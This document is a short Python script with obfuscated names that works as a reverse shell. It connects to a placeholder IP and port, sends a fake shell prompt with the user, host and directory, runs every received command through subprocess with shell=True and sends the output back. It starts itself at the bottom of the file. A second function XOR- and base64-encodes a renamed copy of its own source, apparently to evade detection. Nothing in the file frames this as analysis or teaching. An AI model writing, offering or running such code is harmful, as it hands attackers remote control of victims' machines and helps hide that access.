import os, base64, subprocess, socket, random, string

def _0x2d6():
    _0x2d5 = os.getcwd()
    _0x2d4 = socket.gethostname()
    _0x2d3 = os.getlogin()
    return f"\n{_0x2d3}@{_0x2d4}:{_0x2d5}$ "

def _0x2d2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('IP', PORT))
    while True:
        try:
            s.send(_0x2d6().encode())
            cmd = s.recv(1024).decode().rstrip()
            if not cmd:
                continue
            CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = CMD.communicate()
            s.send(stdout)
            s.send(stderr)
        except Exception as e:
            s.send(str(e).encode())

def _0x2d0():
    filename = ''.join([chr(ord(c) + 3) for c in 'RevShell.py'])
    with open(filename, 'r') as f:
        _0x2cf = f.readlines()
    _0x2ce = []
    for _0x2cd in _0x2cf:
        xor_key = random.randint(1, 255)
        encoded_line = ''.join([chr(ord(c) ^ xor_key) for c in _0x2cd])
        _0x2ce.append(encoded_line)
    _0x2cc = ''.join(_0x2ce)
    encoded_result = base64.b64encode(_0x2cc.encode('utf-8')).decode('utf-8')
    return encoded_result

_0x2d2()
